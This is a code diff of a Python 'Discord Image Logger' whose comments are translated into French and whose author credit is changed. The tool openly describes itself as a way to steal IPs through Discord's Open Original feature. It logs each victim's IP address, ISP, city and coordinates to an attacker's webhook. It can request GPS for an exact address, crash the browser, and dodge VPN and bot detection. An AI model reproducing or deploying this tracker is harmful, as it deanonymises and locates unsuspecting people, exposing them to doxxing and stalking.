@@ -1,70 +1,70 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By Noctavia | https://github.com/Noctavia
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "Une application simple qui vous permet de voler des IP et plus encore en abusant de la fonctionnalité Open Original de Discord"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Noctavia"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://link-to-your-image.here", # Vous pouvez également avoir une image personnalisée en utilisant un argument URL
+# (Par exemple, votresite.com/imagelogger?url=<Insérez ici un lien URL échappé vers une image>)
+    "imageArgument": True, # Vous permet d'utiliser un argument URL pour modifier l'image (VOIR LE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger", # Définissez ceci sur le nom que vous souhaitez donner au webhook
+    "color": 0x00FFFF, # Couleur hexadécimale que vous souhaitez pour l'intégration (exemple : le rouge est 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Essaie de faire planter/geler le navigateur de l'utilisateur, peut ne pas fonctionner. (J'AI FAIT CELA, VOIR https://github.com/Noctavia/chromebook-crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Utilise le GPS pour trouver l'emplacement exact des utilisateurs (adresse réelle, etc.) désactivé car il demande à l'utilisateur ce qui peut être suspect.
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+    "message": { # Afficher un message personnalisé lorsque l'utilisateur ouvre l'image
+        "doMessage": False, # Activer le message personnalisé ?
+        "message": "Ce navigateur a été piraté par Noctavia Image Logger. https://github.com/dekrypted/Image-logger-bot-discord", # Message à afficher
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1,# Empêche les VPN de déclencher l'alerte
+# 0 = Pas d'anti-VPN
+# 1 = Ne pas envoyer de ping lorsqu'un VPN est suspecté
+# 2 = Ne pas envoyer d'alerte lorsqu'un VPN est suspecté
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, # Alerte lorsque quelqu'un envoie le lien (peut ne pas fonctionner si le lien est envoyé plusieurs fois à quelques minutes d'intervalle)
+    "buggedImage": True, # Affiche une image de chargement comme aperçu lorsqu'elle est envoyée dans Discord (peut simplement apparaître comme une image colorée aléatoire sur certains appareils)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
+    "antiBot": 1, # Empêche les robots de déclencher l'alerte
+# 0 = Pas d'anti-bot
+# 1 = Ne pas envoyer de ping lorsqu'il s'agit peut-être d'un robot
+# 2 = Ne pas envoyer de ping lorsqu'il s'agit à 100 % d'un robot
+# 3 = Ne pas envoyer d'alerte lorsqu'il s'agit peut-être d'un robot
+# 4 = Ne pas envoyer d'alerte lorsqu'il s'agit à 100 % d'un robot
     
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False, # Redirection vers une page Web ?
+        "page": "https://your-link.here" # Lien vers la page Web vers laquelle rediriger
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+# Ne modifiez rien en dessous, à moins que vous ne sachiez ce que vous faites.
+# REMARQUE : l'arborescence hiérarchique se présente comme suit :
+# 1) Redirection (si cette option est activée, désactive l'image et fait planter le navigateur)
+# 2) Crash du navigateur (si cette option est activée, désactive l'image)
+# 3) Message (si cette option est activée, désactive l'image)
+# 4) Image
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164") # IP sur liste noire. Vous pouvez saisir une adresse IP complète ou le début pour bloquer un bloc entier.
+# Cette fonctionnalité n'est pas documentée principalement parce qu'elle sert à mieux détecter les robots.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -104,7 +104,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None  # Ne pas envoyer d'alerte si l'utilisateur l'a désactivée
         return
 
     ping = "@everyone"
@@ -154,7 +154,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Contry:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
 > **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
@@ -181,9 +181,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+    # Ce n'est PAS un rat ou un virus, c'est juste une image de chargement. (Créé par moi ! :D)
+# Si vous ne lui faites pas confiance, lisez le code ou ne l'utilisez pas du tout. Veuillez ne pas créer de problème en prétendant qu'il est dupliqué ou malveillant.
+# Vous pouvez consulter l'extrait ci-dessous, qui sert simplement ces octets à tout client suspecté d'être un robot Discord.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = app = ImageLoggerAPI 
